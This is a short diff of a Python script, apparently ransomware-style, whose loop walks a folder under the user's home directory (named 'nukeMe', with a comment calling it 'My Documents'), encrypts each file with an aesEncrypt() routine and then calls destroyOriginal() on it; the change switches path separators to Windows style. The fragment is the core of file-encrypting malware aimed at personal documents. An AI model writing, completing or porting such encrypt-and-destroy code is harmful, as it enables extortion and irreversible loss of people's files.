@@ -32,7 +32,7 @@ def destroyOriginal():
         pass
 
 #Setting the target path "My Documents"
-targetPath = os.path.expanduser('~/nukeMe')
+targetPath = os.path.expanduser('~\\nukeMe')
 rootdir = os.path.expandvars(targetPath)
 
 #targetPath2Raw = R"C:\Users\$USERNAME\nukeMe"
@@ -41,7 +41,7 @@ rootdir = os.path.expandvars(targetPath)
 for subdir, dirs, files in os.walk(rootdir):
     for file in files:
         try:
-            target = rootdir + "/" + str(file)
+            target = rootdir + "\\" + str(file)
             print(target)
             aesEncrypt()   
             destroyOriginal()
